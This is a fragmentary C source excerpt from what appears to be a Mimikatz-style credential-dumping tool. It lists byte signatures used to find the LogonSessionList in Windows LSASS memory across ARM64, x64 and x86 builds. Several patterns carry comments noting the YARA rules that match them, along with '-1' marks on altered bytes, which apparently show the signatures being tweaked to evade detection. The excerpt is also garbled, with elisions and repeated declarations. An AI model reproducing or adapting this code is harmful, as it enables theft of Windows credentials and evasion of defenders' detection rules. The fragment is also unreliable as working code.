...
#if defined(_M_ARM64)
BYTE PTRN_WN1803_LogonSessionList[] = {0xf8, 0x02 /*-1*/, 0x00, 0xaa, 0x58, 0xe7, 0x00, 0xa9};
...
#elif defined(_M_X64)
BYTE PTRN_WIN5_LogonSessionList[]	= {0x4B, 0x8A /*-1*/, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8}; // REFERENCED BY YARA RULE $exe_x64_2
BYTE PTRN_WN60_LogonSessionList[]	= {0x32, 0xFE /*-1*/, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84};
BYTE PTRN_WN61_LogonSessionList[]	= {0x32, 0xf5 /*-1*/, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
BYTE PTRN_WN63_LogonSessionList[]	= {0x8A, 0xdd /*-1*/, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05};
BYTE PTRN_WN6x_LogonSessionList[]	= {0x32, 0xfe /*-1*/, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74}; // REFERENCED BY YARA RULE $exe_x64_1
BYTE PTRN_WN1703_LogonSessionList[]	= {0x32, 0xfe /*-1*/, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74}; // REFERENCED BY YARA RULE $exe_x64_1
BYTE PTRN_WN1803_LogonSessionList[] = {0x32, 0xfe /*-1*/, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74}; // REFERENCED BY YARA RULE $exe_x64_1
KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
...
BYTE PTRN_WN51_LogonSessionList[]	= {0xFE, 0x4F /*-1*/, 0x10, 0x85, 0xc0, 0x0f, 0x84};
BYTE PTRN_WNO8_LogonSessionList[]	= {0x88, 0x70 /*-1*/, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd};  // REFERENCED BY YARA RULE $exe_x86_1
BYTE PTRN_WN80_LogonSessionList[]	= {0x8A, 0x44 /*-1*/, 0xf8, 0x8b, 0x55, 0x08, 0x8b, 0xde, 0x89, 0x02, 0x89, 0x5d, 0xf0, 0x85, 0xc9, 0x74};
BYTE PTRN_WN81_LogonSessionList[]	= {0x8A, 0x4C /*-1*/, 0xe4, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xe8, 0x89, 0x01, 0x85, 0xff, 0x74}; // REFERENCED BY YARA RULE $exe_x86_2
BYTE PTRN_WN6x_LogonSessionList[]	= {0x8A, 0x4C /*-1*/, 0xe8, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xec, 0x89, 0x01, 0x85, 0xff, 0x74}; // REFERENCED BY YARA RULE $exe_x86_2
KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
